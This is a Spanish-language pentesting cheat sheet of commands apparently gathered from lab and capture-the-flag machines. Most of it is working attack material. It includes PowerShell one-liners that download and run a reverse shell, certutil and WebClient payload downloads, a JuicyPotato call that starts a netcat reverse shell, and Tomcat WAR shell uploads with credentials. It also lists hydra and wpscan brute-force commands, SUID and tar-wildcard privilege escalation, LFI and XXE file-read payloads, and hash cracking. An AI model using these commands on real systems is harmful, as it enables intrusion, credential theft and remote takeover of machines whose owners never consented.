---
description: Lista de comandos útiles durante un pentesting
---

# Comandos Utiles

## File Transfer ncat

### Máquina que enviará el archivo (Servidor)

```
nc -l -p port -q 1 > archivo < /dev/null
```

### Máquina que recibirá el archivo (Cliente)

```
cat archivo | netcat serve.ip port
```

## Update all windows

Actualizar todos los paquetes de windows

```
winget upgrade --all
```

## Mejorar remote terminal

Cuando ganas unas sesión remota usar los siguientes comandos para tener una terminal mas iteractiva

{% code overflow="wrap" %}
```bash
# Cuando recibas la conección
script /dev/null -c bash

ctrl +z # LLevar la terminal victima en backgroud

# En terminal atacante
stty raw -echo; fg
reset xterm + enter

# Ajusta filas y columnas
# Sacar cantidad de filas de la terminal atacante
stty size

# en victima exportar el numero de columnas
stty rows 44 columns 184
export TERM=xterm
```
{% endcode %}

## Otros Comandos no categorizados

{% code overflow="wrap" %}
```bash
find SUID files
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;

find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null



hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form “/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed”

hydra -L userid -P credentials.txt 10.10.88.69 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:F=Incorrect*”

hydra -L /usr/share/wordlists/SecLists-master/Usernames/Names/names.txt -pNULL  1.lab.auth.site http-get-form "/ajax.php:fun=login&username=^USER^&password=^PASS^:invalid user" -o result.txt

wpscan --url http://some --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50


para tomcat subir archivos desde consola...
curl -u 'user:password' --upload-file shell.war "http://localhost:8080/manager/text/deploy?path=shell.war"

curl -u  'tomcat:$3cureP4s5w0rd123!' --upload-file /home/parrot/hacktheboxmachines/tabby/shell.war "http://10.10.10.194:8080/manager/text/deploy?path=/shell"

Para jenkins un proyecto ya construido
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
Start-Process "shell-name.exe"


Para crackear una password de zip
fcrackzip -vbDp /usr/share/wordlists/rockyou.txt christmaslists.zip

para obtener archivos desde windows de kali

powershell -c wget "http://<ip>" -outfile "nombre"
o
certutil -urlcache -f http://<kali ip>/gatekeeper.exe gatekeeper.exe 

o
powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.8.98.223/linpeas.sh', 'C:\Users\dark\Desktop\linpeas.sh')"

powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.30/reversewindows.php', 'reversewindows.php')"

Conectar romotamente a windows
xfreerdp /u:Administrator /p:4q6XvFES7Fdxs /v:10.10.155.185
psexec.py user:pass@10.10.55.81

para entrar con un dominio
ssh Administrator@CONTROLLER.local@10.10.145.67


para RDP cuando se tiene AD hay 2 opciones
xfreerdp /u:Administrator /d:controller.local /v:10.10.248.138 #despues de ejecutar pide la contraseña del usuario

rdesktop 10.10.248.138 -g 50% # otra manera pero pide credenciales como un login normal de windows tiene que llevar de usuario algo como controller.local\Administrator y su contrasena correspondiente

wordpress --
una posible con
wp_crop-image
y si no se puede ver el shell
script -qc /bin/bash /dev/null


montar servicio nfs
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.100.202
sudo showmount -e <IP>

└──╼ $sudo mount -t nfs 10.10.155.136:/home /tmp/mount/ -nolock

para ejecutar Juicy potato con netcat
c:\Users\Public>JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *




/wp-content/themes/twentyseventeen/404.php es la ruta si se puede modificar el 404.php


para hacer tunneling de ssh con un usuario valido

ssh -L 8080:localhost:8080 aubreanna@internal.thm


md5
robot:c3fcd3d76192e4007dfb496cca67e13b

sudo john --format=raw-md5  hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
robot:abcdefghijklmnopqrstuvwxyz


bash y ejecutar el netcat sin el rlwrap

import pty...

CTRL^Z

stty raw -echo
fg enter enter

export TERM=xterm
export SHELL=bash

reset

stty rows 9 columns 99 | stty -a



php://filter/convert.base64-encode/resource=../../../var/log/httpd-access.log


privilegios de wildcard
touch -- --checkpoint=1
touch -- "--checkpoint-action=exec=sh demo.sh"

crear una contraseña para shadow de sha-512 crypt
 mkpasswd -m sha-512


crear una reglas con hashcat
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule spellnames.txt > wordlist.txt

basic payload for XXE

<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
 
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>


```
{% endcode %}
